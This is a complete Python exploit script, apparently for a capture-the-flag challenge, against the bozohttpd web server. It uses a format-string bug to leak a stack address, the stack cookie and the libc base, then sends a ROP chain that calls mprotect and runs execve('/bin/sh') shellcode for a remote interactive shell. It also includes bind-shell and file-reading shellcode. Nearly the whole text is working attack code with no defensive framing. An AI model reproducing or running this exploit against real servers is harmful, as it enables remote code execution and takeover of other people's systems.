from pwn import *
from ropper import RopperService
context.arch = 'amd64'


HOST= '127.0.0.1'
PORT= 8080

if args['REMOTE']:
	HOST = '*****'
	PORT = 8080

def get_shellcode_bind_5600():
	#bind on port 5600. taken from https://www.exploit-db.com/exploits/39684/
	return "\x99\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x99\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x6a\x3b\x58\x0f\x05"

def get_shellcode_execve():
	#execve(/bin/sh,0,0). from https://www.exploit-db.com/exploits/38150/
	return "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"

def get_shellcode_read_file(filename):
	#my own shellcode. It opens a file, reads it, and writes to stdout
	shellcode = "\xeb\x49\x5f\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc3\x48\x89\xdf\xbe\x80\x44\x61\x00\xba\x00\x00\x10\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xbe\x80\x44\x61\x00\x48\x89\xc2\xb8\x01\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05\xe8\xb2\xff\xff\xff\x2f"
	shellcode += filename + "\x00"
	return shellcode

def get_libc_path():
	if args['REMOTE']:
		return "./libs/libc-2.25.so"
	else:
		return "./libs/libc-2.24.so"


libc=ELF(get_libc_path())
e=ELF("./bozohttpd")

def request(payload, debug = False, interactive = False):
	r = connect(HOST,PORT)
	
	if args['GDB'] and debug:
		#open new window and attach gdb
		commands=["bp 0x000000000040809F", "c"]
		gdb.attach("bozohttpd", gdbscript="\n".join(commands))
	
	payload=payload.encode("hex")
	r.send("GET /00" + payload + " HTTP/1.1\r\n")
	r.send("Host: http://localhost:8080\r\n")
	r.send("\r\n")
	
	page = r.recvuntil("</html>\n")
	if interactive:
		r.interactive()
		return None
	
	more = r.recvall()
	if more.strip():
		print more
	r.close()
	return page.split(":")[5]

def leak_cookie():
	payload = "%88$p"
	blob = request(payload)
	return int(blob[2:],16)
	
def leak_stack():
	payload = "%8$p"
	blob = request(payload)
	return int(blob[2:],16)	

def leak_byte(addr):
	payload = "%57$s\x00"
	payload += "a"*(256-len(payload))
	payload += p64(addr)

	blob = request(payload)
	if blob == "":
		return 0x00
	
	return u8(blob[0])
    
def leak_8B(addr):
	r = 0x0
	for a in range(addr+7,addr-1,-1):
		r *= 0x100
		r += leak_byte(a)
    
	return r
	

#global instance of ropper
rs = None

def ropper_init():
	global rs

	# options for ropper
	options = {'color' : False,     # if gadgets are printed, use colored output: default: False
            'badbytes': '',   # bad bytes which should not be in addresses or ropchains; default: ''
            'all' : False,      # Show all gadgets, this means to not remove double gadgets; default: False
            'inst_count' : 6,   # Number of instructions in a gadget; default: 6
            'type' : 'rop',     # rop, jop, sys, all; default: all
            'detailed' : False} # if gadgets are printed, use detailed output; default: False

	rs = RopperService(options)
	rs.addFile(get_libc_path())
	rs.setArchitectureFor(name=get_libc_path(), arch='x86_64')
	
	print "loading gadgets from libc..."
	rs.loadGadgetsFor() 


def ropper_find_gadget(gadget_str):
	
	for file, gadget in rs.search(search=gadget_str):
		print "gadget found: " + gadget_str
		return gadget.address
		
#leak any address pointing to the stack to overcome ASLR
leaked_stack_addr = leak_stack()
print "leaked stack addr " + hex(leaked_stack_addr)

#compute address of our payload on the stack
#distance between leaked pointer and our payload is always the same
payload_addr = leaked_stack_addr - 0x360
print "address of our payload = " + hex(payload_addr)

#leak stack cookie
cookie = leak_cookie()
print "leaked stack cookie = " + hex(cookie)
    
#leak some libc function to compute address of libc base
setsockopt_addr = leak_8B(e.got['setsockopt'])
print "setsockopt = " + hex(setsockopt_addr)

libc_base = setsockopt_addr - libc.symbols["setsockopt"]
print "address of libc base = " + hex(libc_base)

#find all necessary gadgets
ropper_init()
pop_rax_addr = ropper_find_gadget('pop rax; ret;') + libc_base
pop_rdi_addr = ropper_find_gadget('pop rdi; ret;') + libc_base
pop_rsi_addr = ropper_find_gadget('pop rsi; ret;') + libc_base
pop_rdx_addr = ropper_find_gadget('pop rdx; ret;') + libc_base
syscall_addr = ropper_find_gadget('syscall; ret;') + libc_base


#functions helpful for creating ROP
def pop_rdi(val):
	return p64(pop_rdi_addr) + p64(val)

def pop_rsi(val):
	return p64(pop_rsi_addr) + p64(val)
	
def pop_rdx(val):
	return p64(pop_rdx_addr) + p64(val)
	
def pop_rax(val):
	return p64(pop_rax_addr) + p64(val)

shellcode_addr = payload_addr+0x258

payload = "a"*504 + p64(cookie) + "a"*8
#ROP chain to make executable stack (by mprotect)
#mprotect(shellcode_addr & 0xFFFFFFFFFFFFF000, 0x02000, rwx)
payload+= pop_rdi(shellcode_addr & 0xFFFFFFFFFFFFF000)		# -> first argument
payload+= pop_rsi(0x2000)									# -> second argument
rwx = constants.PROT_EXEC | constants.PROT_WRITE | constants.PROT_READ
payload+= pop_rdx(rwx)										# -> third argument
payload+= pop_rax(constants.SYS_mprotect)					# -> sycall number
payload+= p64(syscall_addr)
payload+= p64(shellcode_addr)
payload+= get_shellcode_execve()

request(payload, interactive=True, debug=True)

